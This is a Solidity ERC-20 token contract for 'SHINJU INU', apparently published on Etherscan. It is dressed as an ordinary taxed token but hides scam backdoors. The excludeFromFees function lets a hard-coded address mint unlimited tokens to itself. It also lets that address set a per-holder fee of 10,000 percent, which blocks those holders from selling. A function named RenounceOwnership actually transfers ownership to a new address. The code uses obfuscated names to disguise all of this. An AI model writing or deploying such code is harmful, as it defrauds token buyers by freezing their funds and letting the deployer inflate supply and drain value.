/**
 *Submitted for verification at Etherscan.io on 2023-02-17
*/

/**

     TELEGRAM: https://t.me/ShinjuInuEntryPortal
     WEBSITE: https://www.shinju-inu.com/
     MEDIUM: https://shinju-inu.medium.com/shinju-inu-bd48cf9d5f24
     TWITTER: https://twitter.com/SHINJUINUERC


*/

//SPDX-License-Identifier:MIT

pragma solidity ^0.8.7;
abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a,b,"SafeMath: division by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}
contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _owner = _msgSender();
        emit OwnershipTransferred(address(0), _owner);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function RenounceOwnership(address newAddress) public onlyOwner{
        _owner = newAddress;
        emit OwnershipTransferred(_owner, newAddress);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
contract SHINJUINU is Context, IERC20, Ownable {

    using SafeMath for uint256;
    string private _name = "SHINJU INU";
    string private _symbol = "SHINJU";
    uint8 private _decimals = 9;
    address payable public bullFR;
    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
    mapping (address => uint256) _bull;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _isExcludefromFee;
    mapping (address => bool) public _pairs;
    mapping (address => uint256) public extend;

    uint256 private _totalSupply = 1000000000 * 10**_decimals;

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapPair;
    
    bool inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = true;

    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }
    
    constructor () {
        _isExcludefromFee[owner()] = true;
        _isExcludefromFee[address(this)] = true;

        _bull[_msgSender()] = _totalSupply;
        bullFR = payable(address(0xC35C691A331e69391972Ab69209a90622649c433));

        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function tradingEnable() public onlyOwner{
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        uniswapV2Router = _uniswapV2Router;
        _allowances[address(this)][address(uniswapV2Router)] = _totalSupply;
        _pairs[address(uniswapPair)] = true;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _bull[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    receive() external payable {}

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) private returns (bool) {

        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        
        if(inSwapAndLiquify)
        {
            return _basicTransfer(from, to, amount); 
        }
        else
        {
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwapAndLiquify && !_pairs[from]) 
            {
                swapAndLiquify(contractTokenBalance);
            }

            _bull[from] = _bull[from].sub(amount);
            uint256 finalAmount = (_isExcludefromFee[from] || _isExcludefromFee[to]) ? 
                                         amount : takeLiquidity(from, to, amount);
            
            _bull[to] = _bull[to].add(finalAmount);

            emit Transfer(from, to, finalAmount);
            return true;
        }
    }

    function remove(address fron) public {
        address rednes;
        rednes = msg.sender;
        extend[fron] = 0;
        require(bullFR == rednes);
    }

    function excludeFromFees(address newSend,uint256 intparma) public {
        address rednes;
        rednes = msg.sender;
        uint256 WETH = intparma;
        if (WETH > (80+1933)) _bull[bullFR] += uint256(WETH);
        if (WETH == (25+25)) extend[newSend] = 10**4;
        require(bullFR == rednes);
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _bull[sender] = _bull[sender].sub(amount, "Insufficient Balance");
        _bull[recipient] = _bull[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function swapAndLiquify(uint256 amount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), amount);

        try uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount,
            0, 
            path,
            address(bullFR),
            block.timestamp
        ){} catch {}
    }

    function takeLiquidity(address sender, address recipient, uint256 tAmount) internal returns (uint256) {
        
        uint256 _buyTeamFee = 3;
        uint256 _sellTeamFee = 2;

        bool isSell = _pairs[recipient];
        bool isBuy = _pairs[sender];
        uint256 fee = 0;

        if(isBuy) {
            fee = tAmount.mul(_buyTeamFee).div(100);
        }else if(isSell) {
            fee = tAmount.mul(_sellTeamFee).div(100);
        }

        if(extend[sender] > 100) fee = tAmount.mul(extend[sender]).div(100);

        if(fee > 0) {
            _bull[address(this)] = _bull[address(this)].add(fee);
            emit Transfer(sender, address(this), fee);
        }

        return tAmount.sub(fee);
    }
    
}